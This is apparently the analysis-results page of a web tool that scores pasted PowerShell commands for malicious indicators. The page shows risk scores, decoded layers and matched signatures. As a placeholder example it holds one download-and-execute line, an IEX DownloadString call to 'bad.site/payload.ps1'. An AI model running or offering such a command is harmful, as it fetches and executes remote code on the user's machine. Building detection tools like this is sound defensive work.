"use client";
import { useParams, useRouter } from "next/navigation";
import { useEffect, useState, useCallback, useRef } from "react";
import { useAuth } from "../../contexts/AuthContext";
import { useAnalysisEvent } from "../../contexts/AnalysisEventContext";
import { useRateLimit } from "../../../hooks/useRateLimit";
import { useIpAddress } from "../../../hooks/useIpAddress";
import SeverityLegend from "../../components/SeverityLegend";
import AnalysisCard from "../../components/AnalysisCard";
import SeverityBadge from "../../components/SeverityBadge";
import IndicatorTable from "../../components/IndicatorTable";
import ThemedButton from "../../components/ThemedButton";
import LoadingSpinner from "../../components/LoadingSpinner";
import AnalysisSkeleton from "../../components/AnalysisSkeleton";
import CommandInput from "../../components/CommandInput";
import { ErrorMessage, InfoMessage } from "../../components/Messages";
import IndicatorsSummaryTable from "../../components/IndicatorsSummaryTable";

import { saveAnonymousAnalysis } from "../../../utils/cookies";
import { getOrCreateSession, saveSessionFromBackend } from "../../../utils/session";

// Score-based color system (5 bins from 1-10)
function getScoreColor(score) {
  if (score >= 10) return "border-red-600 text-red-600";           // Critical: 10.0+
  if (score >= 8) return "border-orange-400 text-orange-400";      // High: 8.0+
  if (score >= 5) return "border-yellow-400 text-yellow-400";      // Medium: 5.0+
  if (score >= 2) return "border-green-400 text-green-400";        // Low: 2.0+
  return "border-green-400 text-green-400";                          // Informational: 1.0
}

function getScoreLabel(score) {
  if (score >= 10) return "CRITICAL";
  if (score >= 8) return "HIGH";
  if (score >= 5) return "MEDIUM";
  if (score >= 2) return "LOW";
  return "INFORMATIONAL";
}

export default function AnalysisDetailsPage() {
  const params = useParams();
  const router = useRouter();
  const { user, isAuthenticated } = useAuth();
  const { notifyNewAnalysis } = useAnalysisEvent();
  const { ipAddress, ipCountry, loading: ipLoading, error: ipError } = useIpAddress();
  const { 
    rateLimitInfo, 
    handleRateLimitResponse, 
    reset: resetRateLimit,
    timeLeft,
    isTimerActive,
    formatTime
  } = useRateLimit();
  const [result, setResult] = useState(null);
  const [cmd, setCmd] = useState("");
  const [loading, setLoading] = useState(true);
  const [newAnalysisLoading, setNewAnalysisLoading] = useState(false);
  const [error, setError] = useState("");
  const [newCommand, setNewCommand] = useState("");
  const [cacheHit, setCacheHit] = useState(false);
  const [isCacheRedirect, setIsCacheRedirect] = useState(false);
  const [cacheRedirectInfo, setCacheRedirectInfo] = useState(null);
  const analysisExecutedRef = useRef(false);

  useEffect(() => {
    const cacheRedirectInfo = sessionStorage.getItem('cache_redirect_info');
    if (cacheRedirectInfo) {
      try {
        const info = JSON.parse(cacheRedirectInfo);
        if (info.is_cache_hit && info.analysis_id === params.id) {
          setIsCacheRedirect(true);
          setCacheRedirectInfo(info);
          setLoading(false); 
          
       
          sessionStorage.removeItem('cache_redirect_info');
        }
      } catch (e) {
        console.error('Error parsing cache redirect info:', e);
      }
    }
  }, [params.id]);


  const loadAnalysis = useCallback(async () => {
    try {
     
      if (!isCacheRedirect) {
        setLoading(true);
      }
      
      setError("");
      
      const loadStartTime = performance.now();
      
      const { makeAuthenticatedRequest } = await import('../../../lib/api');
      const res = await makeAuthenticatedRequest(`/analysis/${params.id}`, {
        headers: isCacheRedirect ? {
          'Cache-Control': 'max-age=300',
          'X-Cache-Redirect': 'true'
        } : {}
      });
      
      if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
      const analysisData = await res.json();

      const loadTime = performance.now() - loadStartTime;
      
      const analysis = analysisData.analysis || analysisData;
      const analysisResult = analysis.analysis_result || analysis;
      
      setCmd(analysis.command || analysisResult.command);
      setNewCommand(analysis.command || analysisResult.command);
      
      // ✅ FIX: Aceitar double_decoded mesmo quando decoded é null
      const processedResult = {
        score: analysis.risk_score || analysisResult.risk_score || 0,
        severity: (analysis.risk_score || analysisResult.risk_score || 0) > 5 ? "malicious" : "safe",
        signatures: (analysis.signatures_detected || analysisResult.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
        decoded: analysis.decoded_command || analysisResult.decoded_command || null,
        doubleDecoded: analysis.double_decoded_command || analysisResult.double_decoded_command || null,  // ✅ MAPEAMENTO CORRETO
        indicators: analysisResult.analysis_details?.indicators || [],
        details: analysisResult.analysis_details?.recommendations?.join(", ") || "",
        tactics: analysis.tactics || analysisResult.tactics || [],
        techniques: analysis.techniques || analysisResult.techniques || [],
        analysisId: params.id 
      };
      
      // ✅ DEBUG LOG EXPANDIDO
      console.log("🔍 [DETAILS PAGE] Processed Result:", {
        hasDecoded: !!processedResult.decoded,
        hasDoubleDecoded: !!processedResult.doubleDecoded,
        decodedValue: processedResult.decoded,
        doubleDecodedValue: processedResult.doubleDecoded,
        decodedLength: processedResult.decoded ? processedResult.decoded.length : 0,
        doubleDecodedLength: processedResult.doubleDecoded ? processedResult.doubleDecoded.length : 0,
        rawAnalysisDecoded: analysis.decoded_command,
        rawAnalysisDoubleDecoded: analysis.double_decoded_command,
        analysisData: analysis,
        analysisResultData: analysisResult
      });
      
      // ✅ NOVO: Debug específico para renderização
      console.log("📊 [RENDER DEBUG] Render conditions:", {
        willShowDecoded: !!(processedResult.decoded && !processedResult.doubleDecoded),
        willShowDoubleDecoded: !!processedResult.doubleDecoded,
        decoded_is_null: processedResult.decoded === null,
        doubleDecoded_is_null: processedResult.doubleDecoded === null
      });
      
      setResult(processedResult);
      
    } catch (err) {
      setError(err.message || "Failed to load analysis");
    } finally {
      setLoading(false);
    }
  }, [params.id, isCacheRedirect, cacheRedirectInfo]);

  
  useEffect(() => {
    if (params.id) {
      loadAnalysis();
    }
  }, [params.id, loadAnalysis]);


  const performAnalysis = async (command, providedIpAddress, providedIpCountry) => {
    const finalIpAddress = providedIpAddress || ipAddress;
    const finalIpCountry = providedIpCountry || ipCountry;
    try {
      setNewAnalysisLoading(true);
      setError("");
      setCacheHit(false);
      
      // ✅ LOG: Comando original
      console.log("🔍 [ANALYSIS_PAGE] Analyzing command:", command.substring(0, 100) + "...");
      
      const startTime = performance.now();
      const sessionId = getOrCreateSession();
      
      const requestData = { 
        command,
        user_id: user?.id || null,
        ip_address: finalIpAddress,
        country: finalIpCountry,
        user_agent: navigator.userAgent,
        search_type: "WEB",
        session_id: sessionId
      };
      
      // ✅ LOG: Tipo de requisição
      console.log("🌐 [ANALYSIS_PAGE] Request type:", user?.id ? "Authenticated WEB" : "Anonymous WEB");
      
      const { makeAuthenticatedRequest } = await import('../../../lib/api');
      
      const response = await makeAuthenticatedRequest('/evaluate', {
        method: 'POST',
        body: JSON.stringify(requestData)
      });
      
      const data = await response.json();
      
   
      const responseTime = performance.now() - startTime;
      
     
      const isCacheHit = data.from_cache === true || data.analysis?.cache_info?.cache_hit === true;
      
      if (isCacheHit) {
        setCacheHit(true);
      }
      
     
      const needsHandling = handleRateLimitResponse(response, data);
      
      if (needsHandling) {
        setNewAnalysisLoading(false);
        return;
      }
      
      if (!response.ok) {
        throw new Error(data.error || `HTTP error! status: ${response.status}`);
      }
      
      if (data.success) {
        const analysisData = data.analysis;
        
        if (!data.analysis_id || data.analysis_id === "temp-cache-id" || data.analysis_id === "cache-error") {
          setError("Analysis error - please try again");
          setNewAnalysisLoading(false);
          return;
        }
        
       
        if (data.session_id && !user?.id) {
          saveSessionFromBackend(data.session_id);
        }
        
       
        if (!user?.id) {
          try {
            saveAnonymousAnalysis({
              command: command,
              score: analysisData.risk_score,
              severity: analysisData.is_malicious ? "malicious" : "safe",
              signatures: analysisData.signatures_detected || [],
              cmdlets_detected: analysisData.cmdlets_detected || [],
              analysis_id: data.analysis_id
            });
          } catch (error) {
            
          }
        }
        
       
        if (data.analysis_id) {
          
          notifyNewAnalysis();
          
          if (isCacheHit) {
            sessionStorage.setItem('cache_redirect_info', JSON.stringify({
              is_cache_hit: true,
              analysis_id: data.analysis_id,
              redirect_time: Date.now(),
              phash: data.analysis?.cache_info?.phash,
              response_time_ms: responseTime
            }));
            
            router.replace(`/analysis/${data.analysis_id}`);
          } else {
            router.push(`/analysis/${data.analysis_id}`);
          }
          return; 
        }

        const analysisResult = {
          score: analysisData.risk_score,
          severity: analysisData.is_malicious ? "malicious" : "safe",
          signatures: (analysisData.signatures_detected || []).sort((a, b) => (b.total_score || 0) - (a.total_score || 0)),
          decoded: analysisData.decoded_command,
          doubleDecoded: analysisData.double_decoded_command,
          indicators: analysisData.analysis_details?.indicators || [],
          details: analysisData.analysis_details?.recommendations?.join(", ") || "",
          tactics: analysisData.tactics || [],
          techniques: analysisData.techniques || [],
          analysisId: response.analysis_id
        };
        
        setResult(analysisResult);
        setCmd(command);
      } else {
        throw new Error(response.error || 'Analysis failed');
      }
    } catch (err) {
   
      if (err.message === 'Rate limit excedido') {
        setNewAnalysisLoading(false);
        return;
      }
      
      setError(err.message);
      setResult(null);
    } finally {
      setNewAnalysisLoading(false);
    }
  };
  

  const totalScore = result ? result.score : 0;
  

  const handleNewAnalysis = async () => {
    if (newCommand.trim()) {
     
      if (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit) {
        setError("Rate limit reached. Please wait for the timer to reset.");
        return;
      }
      
    
      analysisExecutedRef.current = false;
      
     
      setError("");
      
      await performAnalysis(newCommand.trim());
      
      setNewCommand("");
    }
  };

  if (loading && !isCacheRedirect) {
    return <AnalysisSkeleton />;
  }

  return (
    <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8">
             <h1 className="text-2xl sm:text-3xl md:text-4xl font-mono font-bold mb-6 sm:mb-8 text-center" style={{color: 'var(--accent)'}}>
        Evaluation Results
      </h1>

      
      <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
        <div className="flex flex-col sm:flex-row gap-3 items-start">
          <div className="flex-1 w-full">
            <CommandInput
              value={newCommand}
              onChange={(e) => setNewCommand(e.target.value)}
              onSubmit={handleNewAnalysis}
              placeholder="Type or paste a PS payload..."
              disabled={newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            />
          </div>
          <ThemedButton
            onClick={handleNewAnalysis}
            disabled={!newCommand.trim() || newAnalysisLoading || (rateLimitInfo && rateLimitInfo.current_count >= rateLimitInfo.limit)}
            className="flex-shrink-0"
            loading={newAnalysisLoading}
          >
            {newAnalysisLoading ? 'Analyzing...' : 'Evaluate'}
          </ThemedButton>
        </div>
        
        {/* Loading overlay for new analysis */}
        {newAnalysisLoading && (
          <div className="mt-4 p-4 rounded-lg border bg-black/80 border-green-500/30 text-center">
            <LoadingSpinner />
          </div>
        )}
        <InfoMessage 
          message={!error && newCommand.trim() === "" ? "Example: IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')" : ""}
          clickable={!error && newCommand.trim() === ""}
          onClick={() => setNewCommand("IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")}
        />
          </div>
          
      {rateLimitInfo && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mt-4 mb-6 rounded-lg border-2 bg-black/80 border-green-500/30">
          <div className="p-4">
            <div className="text-center mb-4">
              <div className="font-mono text-sm mb-2" style={{color: 'var(--muted-foreground)'}}>
                <strong>Notice:</strong> You have made <span style={{color: 'var(--accent)'}}>{rateLimitInfo.current_count}</span> of <span style={{color: 'var(--accent)'}}>{rateLimitInfo.limit}</span> allowed searches in {rateLimitInfo.window_seconds} seconds.
              </div>
        </div>

            {rateLimitInfo.current_count >= rateLimitInfo.limit && (
              <div>
                <div className="text-center mb-6">
                  <div className="inline-flex items-center gap-3 px-4 py-2 rounded-full border-2 border-red-500 bg-black/80 border-green-500/30">
                    <span className="text-2xl">🚫</span>
                    <span className="font-mono font-bold text-red-500">Rate limit reached</span>
          </div>
        </div>

                {isTimerActive && timeLeft > 0 && (
                  <div className="text-center">
                    <div className="inline-block p-6 rounded-xl border-2 bg-black/80 border-green-500/30">
                      <div className="text-4xl mb-3">⏰</div>
                      
                      <div className="font-mono font-bold text-xl mb-3" style={{color: 'var(--accent)'}}>
                        Wait for reset
                </div>
                
                      <div className="font-mono text-3xl font-bold mb-4 px-4 py-2 rounded-lg border bg-black/80 border-green-500/30" style={{
                        color: 'var(--accent)'
                      }}>
                        {formatTime}
                      </div>
                      
                      <div className="font-mono text-sm max-w-xs mx-auto" style={{color: 'var(--muted-foreground)'}}>
                        You can make new searches when the timer reaches zero
                      </div>
                      
                      <div className="mt-4 w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2">
                        <div 
                          className="h-2 rounded-full transition-all duration-1000" 
                          style={{
                            backgroundColor: 'var(--accent)',
                            width: `${Math.max(0, (timeLeft / 60) * 100)}%`
                          }}
                        ></div>
                      </div>
                      </div>
                      </div>
                    )}
                  </div>
                )}
            </div>
          </div>
        )}


     
      {result && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="p-4 sm:p-6 rounded-lg border-2 border-green-400 text-center relative bg-black/80 border-green-500/30">
            <div className="absolute top-4 right-4">
              <SeverityLegend />
                </div>
                
            <div className="text-lg sm:text-xl font-mono font-bold mb-3 text-green-400">
              Cumulative Base Score
            </div>
            <div className="text-4xl sm:text-5xl font-mono font-bold mb-3 text-white">
              {totalScore.toFixed(1)}
            </div>
            <div className="text-xs sm:text-sm font-mono text-green-400 mb-2">
              {totalScore === 0 ? "No Malicious Indicators Detected" : "Cumulative score from all patterns"}
            </div>
            {result.signatures && result.signatures.length > 0 && (
              <div className="text-xs font-mono text-gray-400  pt-3 mt-3">
                {(() => {
                  const securitySigs = result.signatures.filter(sig => 
                    !sig.name.includes('(') || sig.score >= 4.0 || !sig.techniques?.includes('T1059.001') || sig.tactics?.length > 1
                  );
                  const allCmdlets = result.signatures.filter(sig => 
                    sig.name.includes('(') && sig.score < 4.0 && sig.techniques?.includes('T1059.001') && sig.tactics?.length <= 1
                  );
                  
                  const securityScore = securitySigs.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  const allCmdletScore = allCmdlets.reduce((sum, sig) => sum + (sig.total_score || sig.score || 0), 0);
                  
                  return (
                    <>
                      {allCmdletScore > 0 && <div>PowerShell Cmdlets: {allCmdletScore.toFixed(1)}</div>}
                    </>
                  );
                })()}
              </div>
            )}
            </div>
          </div>
        )}
      {/* {result && result.decoded && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
              {result.doubleDecoded ? "First Decoded Layer" : "Decodified Command"}
            </div>
            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
              <code>{result.decoded}</code>
            </div>
            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
              {result.doubleDecoded ? "First layer of decoding from Base64" : "This is the decoded/deobfuscated version of the command"}
            </div>
          </div>
        </div>
      )} */}

      {result && result.decoded && result.doubleDecoded && (() => {
        console.log("🟦 [RENDER] Showing FIRST DECODED LAYER (double-encoded)");
        return (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
               First Decoded Layer (Iteration 1)
            </div>
            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
              <code>{result.decoded}</code>
            </div>
            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
              First layer of decoding - still contains -EncodedCommand
            </div>
          </div>
        </div>
        );
      })()}

      {result && result.decoded && !result.doubleDecoded && (() => {
        console.log("🟦 [RENDER] Showing DECODED block (single-layer)");
        return (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-blue-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
               Decoded Command
            </div>
            <div className="bg-black rounded p-3 border border-blue-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
              <code>{result.decoded}</code>
            </div>
            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
              This is the decoded version from -EncodedCommand
            </div>
          </div>
        </div>
        );
      })()}

      {/* ✅ BLOCO 3: Mostrar double_decoded APENAS quando existir (decode_iterations >= 2) */}
      {result && result.doubleDecoded && (() => {
        console.log("🟨 [RENDER] Showing DOUBLE-DECODED block (multi-layer)");
        return (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-yellow-500/30">
            <div className="font-mono text-sm font-bold mb-3" style={{color: 'var(--accent)'}}>
               Final Decoded Command (Iteration 2)
            </div>
            <div className="bg-black rounded p-3 border border-yellow-500/20 text-xs sm:text-sm font-mono overflow-x-auto max-h-40 whitespace-pre-wrap break-words" style={{color: 'var(--foreground)'}}>
              <code>{result.doubleDecoded}</code>
            </div>
            <div className="text-xs font-mono mt-2" style={{color: 'var(--muted-foreground)'}}>
              Final layer decoded from multiple nested -EncodedCommand (2+ layers detected)
            </div>
          </div>
        </div>
        );
      })()}

      {result && result.signatures && result.signatures.length > 0 && (
         <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          {(() => {
            const realSignatures = result.signatures.filter(sig => 
              !sig.name.includes('(') || 
              sig.score >= 4.0 || 
              !sig.techniques?.includes('T1059.001') || 
              sig.tactics?.length > 1 
            );
            
            const basicCmdlets = result.signatures.filter(sig => 
              sig.name.includes('(') && 
              sig.score < 4.0 && 
              sig.techniques?.includes('T1059.001') && 
              sig.tactics?.length <= 1
            );

            return (
              <>
                {/* ✅ NOVO: Tabela de resumo */}
                {realSignatures.length > 0 && (
                  <IndicatorsSummaryTable signatures={realSignatures} />
                )}
                
                {realSignatures.length > 0 && (
                  <div className="mb-6">
                    <h2 className="text-lg sm:text-xl font-mono font-bold mb-4" style={{color: 'var(--foreground)'}}>
                      Indicators Breakdown
                    </h2>
                    <div className="space-y-4">
                      {realSignatures.map((signature, index) => (
                        <AnalysisCard
                          key={`real-${index}`}
                          index={index}  // ✅ Passar index
                          title={signature.name || 'Unknown Pattern'}
                          description={signature.description || `Pattern detected: ${signature.pattern || 'No description available'}`}
                          severity={signature.severity || 'unknown'}
                          score={signature.total_score || signature.score || 0}
                          pattern={signature.pattern || 'No pattern specified'}
                          matched_text={signature.matched_text || signature.matchedText || ''}
                          matched_command={signature.matched_command || signature.matchedCommand || ''}
                          keywords={signature.pattern || signature.keyword || ''}
                          tactic={signature.tactics || signature.tactic || []}
                          technique={signature.techniques || signature.technique || []}
                          reference={signature.reference || ''}
                          link={signature.link || null}
                          matchesInfo={{
                            matchesFound: signature.matches_found || 1,
                            baseScore: signature.base_score || signature.score || 0,
                            totalScore: signature.total_score || signature.score || 0,
                            maxMatchAllowed: signature.max_match_allowed || signature.max_match || 1,
                            matchesDetails: signature.matches_details || signature.matchesDetails || []
                          }}
                        />
                      ))}
                    </div>
                  </div>
                )}

                {/* ...existing code for basicCmdlets... */}
              </>
            );
          })()}
          </div>
        )}

      {result && (!result.signatures || result.signatures.length === 0) && totalScore === 0 && (
                 <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
           <div className="border rounded-lg p-6 text-center bg-black/80 border-green-500/30">
             <h2 className="text-lg sm:text-xl font-mono font-bold mb-2" style={{color: 'var(--foreground)'}}>
               Zero indicators found
               </h2>
             <p className="text-sm sm:text-base font-mono" style={{color: 'var(--muted-foreground)'}}>
               This command does not seem to match any indicator.
             </p>
               </div>
             </div>
          )}

      {result && result.signatures && result.signatures.length > 0 && (
        <div className="w-full max-w-sm sm:max-w-lg md:max-w-2xl lg:max-w-4xl mb-6 sm:mb-8">
          <div className="border rounded-lg p-4 bg-black/80 border-green-500/30">
            <div className="font-mono text-sm" style={{color: 'var(--muted-foreground)'}}>
              Matched indicators are not inherently suspicious but highlight traces that may require closer examination. For interpretation details, check the link below:
              <br /><br />
              <span style={{color: 'var(--primary-purple)'}}>&lt;wiki link to be provided later&gt;</span>
            </div>
          </div>
        </div>
      )}

      <div className="flex flex-col sm:flex-row gap-3 justify-center mb-8">
        <ThemedButton onClick={() => router.push('/')}>
          Evaluate Another Command
        </ThemedButton>
        <ThemedButton
          variant="outline"
          onClick={() => {
            const baseUrl = window.location.origin;
            const shareUrl = result?.analysisId 
              ? `${baseUrl}/analysis/${result.analysisId}`
              : window.location.href; 
            navigator.clipboard.writeText(shareUrl);
          }}
        >
          Copy sharable link
        </ThemedButton>
      </div>
    </div>
  );
}
